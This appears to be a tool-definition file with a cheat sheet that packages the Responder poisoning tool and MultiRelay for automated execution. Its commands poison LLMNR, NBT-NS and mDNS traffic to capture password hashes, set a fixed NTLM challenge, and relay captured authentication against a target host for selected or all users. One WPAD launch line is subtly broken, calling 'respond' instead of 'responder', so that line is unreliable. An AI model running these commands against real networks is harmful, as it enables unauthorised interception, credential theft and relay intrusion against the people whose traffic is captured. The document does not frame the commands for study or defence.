---
trust_level: community
id: darkiros-responder
namespace: darkiros:tool:responder
name: responder
description: Responder - Launch
version: 1.0.0
capabilities:
- credential.discovery.reconnaissance
- network.intercept.mitm
- utility.generic
platforms:
- cross-platform
techniques:
- collection
- discovery
- execution
execution:
  template: responder
  sandbox: execFile
  timeout_seconds: 30
  shell: false
examples:
- description: Responder - Launch
  command: responder -I [interface]
- description: Responder - Launch analyze mode (no poisoning)
  command: responder -I [interface] -A
- description: Responder - Launch with wpad file
  command: respond -I [interface] --wpad
- description: Responder - http on
  command: sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf &&
    cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
- description: Responder - http off
  command: sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf &&
    cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
- description: Responder - smb on
  command: sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf &&
    cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
- description: Responder - smb off
  command: sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf &&
    cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
- description: Responder - challenge set
  command: sed -i 's/Challenge =.*$/Challenge = <challenge>/g' /opt/tools/Responder/Responder.conf
    && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='
- description: Responder - challenge reset
  command: sed -i 's/Challenge =.*$/Challenge = /g' /opt/tools/Responder/Responder.conf
    && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='
- description: multirelay attack - user filtered (previous disable HTTP and SMB in
    Responder.conf)
  command: multirelay -t [ip] -u [user1] [user2]
- description: multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)
  command: multirelay -t [ip] -u all
references:
- label: Source
  url: https://github.com/lgandx/Responder
- label: Darkiros
  url: https://darkiros.github.io/commands.html
items:
- Hash
- Password
services:
- LLMNR
- NBT-NS
- MDNS
- SMB
- HTTP
features:
- network-intensive
mitre_ids:
- T1557
- T1046
---

# responder

Darkiros cheat sheet commands:

**Responder - Launch**
```
responder -I [interface]
```

**Responder - Launch analyze mode (no poisoning)**
```
responder -I [interface] -A
```

**Responder - Launch with wpad file**
```
respond -I [interface] --wpad
```

**Responder - http on**
```
sed -i 's/HTTP = Off/HTTP = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

**Responder - http off**
```
sed -i 's/HTTP = On/HTTP = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'HTTP ='
```

**Responder - smb on**
```
sed -i 's/SMB = Off/SMB = On/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

**Responder - smb off**
```
sed -i 's/SMB = On/SMB = Off/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'SMB ='
```

**Responder - challenge set**
```
sed -i 's/Challenge =.*$/Challenge = <challenge>/g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='
```

**Responder - challenge reset**
```
sed -i 's/Challenge =.*$/Challenge = /g' /opt/tools/Responder/Responder.conf && cat /opt/tools/Responder/Responder.conf | grep --color=never 'Challenge ='
```

**multirelay attack - user filtered (previous disable HTTP and SMB in Responder.conf)**
```
multirelay -t [ip] -u [user1] [user2]
```

**multirelay attack - all user (previous disable HTTP and SMB in Responder.conf)**
```
multirelay -t [ip] -u all
```
